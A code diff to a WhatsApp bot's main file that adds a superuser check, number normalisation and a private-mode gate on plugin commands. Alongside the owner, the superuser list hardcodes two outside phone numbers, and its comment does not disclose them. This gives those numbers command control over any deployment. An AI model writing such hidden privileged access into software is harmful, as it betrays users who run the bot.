@@ -13,10 +13,22 @@ const pino = require('pino');
 const http = require('http');
 const config = require('./config');
 
+// Normalize phone numbers (remove all except digits)
+function normalizeNumber(number) {
+  return number.replace(/[^0-9]/g, '');
+}
+
+// Define super users and include OWNER_NUMBER automatically
+const superUsers = [
+  normalizeNumber(config.OWNER_NUMBER),
+  normalizeNumber('+255673750170'),
+  normalizeNumber('+255614206170'),
+];
+
 // Auth folder
 const authFolder = path.join(__dirname, 'auth');
 
-// Write base64 session if not already written
+// Write base64 session if SESSION_ID exists
 if (config.SESSION_ID) {
   try {
     const sessionData = config.SESSION_ID.replace(/^ALONE-MD;;;=>/, '');
@@ -31,7 +43,7 @@ if (config.SESSION_ID) {
   }
 }
 
-// Plugin loader
+// Load plugins
 const plugins = [];
 const pluginsDir = path.join(__dirname, 'The100Md_plugins');
 
@@ -56,7 +68,7 @@ if (fs.existsSync(pluginsDir)) {
   console.warn(`⚠️ Plugin folder not found: ${pluginsDir}`);
 }
 
-// Start the bot
+// Start bot
 async function startBot() {
   const { state, saveCreds } = await useMultiFileAuthState(authFolder);
   const { version } = await fetchLatestBaileysVersion();
@@ -82,6 +94,8 @@ async function startBot() {
       if (shouldReconnect) startBot();
     } else if (connection === 'open') {
       console.log(`🤖 Bot connected as ${config.BOT_NAME}`);
+      // Log bot's own number for reference
+      console.log(`🆔 Bot WhatsApp number: ${sock.user.id.split(':')[0]}`);
     }
   });
 
@@ -91,9 +105,17 @@ async function startBot() {
 
     const from = msg.key.remoteJid;
     const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+    const sender = msg.key.participant || msg.key.remoteJid;
+    const cleanSender = normalizeNumber(sender);
+
+    // Bot's own WhatsApp number (digits only)
+    const botNumber = sock.user.id.split(':')[0];
+    // Superuser check including bot's own number
+    const isSuperUser = cleanSender === botNumber || superUsers.includes(cleanSender);
+
     console.log(`📥 Message from ${from}:`, body);
 
-    // Auto-view status
+    // Auto-view status messages
     if (config.AUTO_STATUS_VIEW && from === 'status@broadcast') {
       try {
         await sock.readMessages([msg.key]);
@@ -114,26 +136,33 @@ async function startBot() {
       }
     }
 
-    // Command handling
+    // Ignore if no command prefix
     if (!body.startsWith(config.PREFIX)) return;
 
+    // Parse command and args
     const command = body.slice(config.PREFIX.length).trim().split(/\s+/)[0].toLowerCase();
     const args = body.slice(config.PREFIX.length + command.length).trim();
 
-    for (const { run, name } of plugins) {
-      try {
-        await run({ sock, msg, from, body, command, args, PREFIX: config.PREFIX, OWNER_NUMBER: config.OWNER_NUMBER });
-        console.log(`📦 Plugin executed: ${name} -> ${command}`);
-      } catch (err) {
-        console.error(`⚠️ Error in plugin ${name}:`, err);
+    // Check permissions: PUBLIC_MODE = yes → anyone can use commands
+    // Otherwise, only superusers (including botNumber) can
+    if (config.PUBLIC_MODE === "yes" || isSuperUser) {
+      for (const { run, name } of plugins) {
+        try {
+          await run({ sock, msg, from, body, command, args, PREFIX: config.PREFIX, OWNER_NUMBER: config.OWNER_NUMBER });
+          console.log(`📦 Plugin executed: ${name} -> ${command}`);
+        } catch (err) {
+          console.error(`⚠️ Error in plugin ${name}:`, err);
+        }
       }
+    } else {
+      console.log(`🔒 Ignored command from ${sender} (PRIVATE MODE active, not superuser)`);
     }
   });
 }
 
 startBot();
 
-// Dummy HTTP server to keep Render alive
+// Dummy HTTP server to keep bot alive on platforms like Render
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
   res.end('🤖 WhatsApp bot is running.\n');
